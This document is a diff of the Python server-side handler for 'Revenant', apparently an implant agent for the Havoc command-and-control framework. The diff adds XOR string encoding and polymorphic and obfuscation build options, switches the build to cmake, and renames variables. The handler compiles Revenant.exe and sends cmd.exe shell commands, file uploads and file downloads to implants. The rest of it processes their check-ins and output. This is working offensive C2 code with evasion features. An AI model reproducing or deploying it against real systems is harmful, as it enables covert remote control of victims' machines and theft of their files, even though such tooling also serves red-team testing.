@@ -14,6 +14,24 @@ COMMAND_DOWNLOAD: int = 0x154
 COMMAND_EXIT: int = 0x155
 COMMAND_OUTPUT: int = 0x200
 
+GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
+
+
+def xor_encode(s: str) -> str:
+    password_bytes: bytes = GENERATED_PASSWORD.encode()
+    password_cycle: bytes = (password_bytes * (len(s) // len(password_bytes) + 1))[:len(s)]
+    xor_bytes: bytes = bytes(b1 ^ b2 for b1, b2 in zip(s.encode(), password_cycle))
+    return ", ".join(f"0x{b:02x}" for b in xor_bytes)
+
+
+def replace_in_file(filename, old_string, new_string):
+    with open(filename, "r+") as f:
+        file_contents = f.read()
+        updated_file_contents = file_contents.replace(old_string, new_string)
+        f.seek(0)
+        f.truncate()
+        f.write(updated_file_contents)
+
 
 def process_config_h(config: dict):
     config_user_agent:         str = config['Options']['Listener']['UserAgent']
@@ -21,19 +39,20 @@ def process_config_h(config: dict):
     config_host_port:          str = config['Options']['Listener']['Port']
     config_host_secure:        str = str(config['Options']['Listener']['Secure']).upper()
     config_sleep:              str = config['Config']['Sleep']
-    #config_unmap:              str = str(config['Config']['Unmap'])
-    config_poly:               str = str(config['Config']['Poly Obf'])
-    config_obf_strings:        str = str(config['Config']['Obf Strings'])
+    config_poly:               str = str(config['Config']['Polymorphic'])
+    config_obf_strings:        str = str(config['Config']['Obfuscation'])
+    config_arch:               str = config['Options']['Arch']
 
-    header_file = f'''\
+    header_file = f'''
 #define CONFIG_USER_AGENT L"{config_user_agent}"
 #define CONFIG_HOST L"{config_host_bind}"
 #define CONFIG_PORT {config_host_port}
 #define CONFIG_SECURE {str(config_host_secure).upper()}
 #define CONFIG_SLEEP {config_sleep} 
-#define CONFIG_POLY {str(config_poly).upper()}  
-#define CONFIG_OBF_STRINGS {str(config_obf_strings).upper()}  
-    ''' ##define CONFIG_UNMAP {str(config_unmap).upper()}
+#define CONFIG_POLYMORPHIC {str(config_poly).upper()}  
+#define CONFIG_OBFUSCATION {str(config_obf_strings).upper()}
+#define CONFIG_ARCH {config_arch}  
+    '''
 
     for filepath in glob.iglob('**/Config.h', recursive=True):
         with open(filepath, 'w') as f:
@@ -57,10 +76,10 @@ class CommandShell(Command):
         ]
 
     def job_generate(self, arguments: dict) -> bytes:
-        Task: Packer = Packer()
-        Task.add_int(self.CommandId)
-        Task.add_data("c:\\windows\\system32\\cmd.exe /c " + arguments['commands'])
-        return Task.buffer
+        task: Packer = Packer()
+        task.add_int(self.CommandId)
+        task.add_data("c:\\windows\\system32\\cmd.exe /c " + arguments['commands'])
+        return task.buffer
 
 
 class CommandUpload(Command):
@@ -85,13 +104,13 @@ class CommandUpload(Command):
         ]
 
     def job_generate(self, arguments: dict) -> bytes:
-        Task: Packer = Packer()
+        task: Packer = Packer()
         remote_file: str = arguments['remote_file']
         filedata = b64decode(arguments['local_file']).decode()
-        Task.add_int(self.CommandId)
-        Task.add_data(remote_file)
-        Task.add_data(filedata)
-        return Task.buffer
+        task.add_int(self.CommandId)
+        task.add_data(remote_file)
+        task.add_data(filedata)
+        return task.buffer
 
 
 class CommandDownload(Command):
@@ -111,11 +130,11 @@ class CommandDownload(Command):
         ]
 
     def job_generate(self, arguments: dict) -> bytes:
-        Task: Packer = Packer()
+        task: Packer = Packer()
         remote_file: str = arguments['remote_file']
-        Task.add_int(self.CommandId)
-        Task.add_data(remote_file)
-        return Task.buffer
+        task.add_int(self.CommandId)
+        task.add_data(remote_file)
+        return task.buffer
 
 
 class CommandExit(Command):
@@ -129,9 +148,9 @@ class CommandExit(Command):
         self.Params: list = []
 
     def job_generate(self, arguments: dict) -> bytes:
-        Task: Packer = Packer()
-        Task.add_int(self.CommandId)
-        return Task.buffer
+        task: Packer = Packer()
+        task.add_int(self.CommandId)
+        return task.buffer
 
 
 class Revenant(AgentType):
@@ -149,9 +168,8 @@ class Revenant(AgentType):
         ]
         self.BuildingConfig: dict = {
             "Sleep": "10",
-            #"Unmap": True,
-            "Poly Obf": True,
-            "Obf Strings":True
+            "Polymorphic": True,
+            "Obfuscation": True
         }
         self.Commands: list = [
             CommandShell(),
@@ -173,7 +191,8 @@ class Revenant(AgentType):
 
         print("[*] Configuring Config.h header...")
         process_config_h(config)
-        compile_command: str = "cd ./Agent && make"
+        # compile_command: str = "cd ./Agent && make"
+        compile_command: str = "cmake . && cmake --build . -j 1"
 
         try:
             process = subprocess.run(compile_command,
@@ -187,7 +206,7 @@ class Revenant(AgentType):
             print(f"Error occurred: {error.stderr}")
             return
 
-        data = open("./Agent/Bin/Revenant.exe", "rb").read()
+        data = open("Agent/Bin/Revenant.exe", "rb").read()
 
         # Below line sends the build executable back to Havoc for file management - 0xtriboulet
         self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)
@@ -197,10 +216,10 @@ class Revenant(AgentType):
         agent_header: dict = response["AgentHeader"]
         agent_response = b64decode(response["Response"])
         response_parser = Parser(agent_response, len(agent_response))
-        Command: int = response_parser.parse_int()
+        command: int = response_parser.parse_int()
 
         if response["Agent"] is None:
-            if Command == COMMAND_REGISTER:
+            if command == COMMAND_REGISTER:
                 print("[*] Is agent register request")
 
                 registerinfo = {
@@ -254,33 +273,33 @@ class Revenant(AgentType):
             else:
                 print("[-] Is not agent register request")
         else:
-            print(f"[*] Something else: {Command}")
+            print(f"[*] Something else: {command}")
             agentid = response["Agent"]["NameID"]
-            if Command == COMMAND_GET_JOB:
+            if command == COMMAND_GET_JOB:
                 print("[*] Get list of jobs and return it.")
-                Tasks = self.get_task_queue(response["Agent"])
+                tasks = self.get_task_queue(response["Agent"])
 
-                if len(Tasks) == 0:
-                    Tasks = COMMAND_NO_JOB.to_bytes(4, 'little')
+                if len(tasks) == 0:
+                    tasks = COMMAND_NO_JOB.to_bytes(4, 'little')
 
-                print(f"Tasks: {Tasks.hex()}")
-                return Tasks
+                print(f"tasks: {tasks.hex()}")
+                return tasks
 
-            elif Command == COMMAND_OUTPUT:
+            elif command == COMMAND_OUTPUT:
                 output = response_parser.parse_str()
                 print("[*] Output: \n" + output)
                 self.console_message(agentid, "Good", "Received Output:", output)
-            elif Command == COMMAND_UPLOAD:
+            elif command == COMMAND_UPLOAD:
                 filesize = response_parser.parse_int()
                 filename = response_parser.parse_str()
                 self.console_message(agentid, "Good", f"File was uploaded: {filename} ({filesize} bytes)", "")
-            elif Command == COMMAND_DOWNLOAD:
+            elif command == COMMAND_DOWNLOAD:
                 filename = response_parser.parse_str()
                 filecontent = response_parser.parse_str()
                 self.console_message(agentid, "Good", f"File was downloaded: {filename} ({len(filecontent)} bytes)", "")
                 self.download_file(agentid, filename, len(filecontent), filecontent)
             else:
-                self.console_message(agentid, "Error", "Command not found: %4x" % Command, "")
+                self.console_message(agentid, "Error", "command not found: %4x" % command, "")
 
         return b''
 
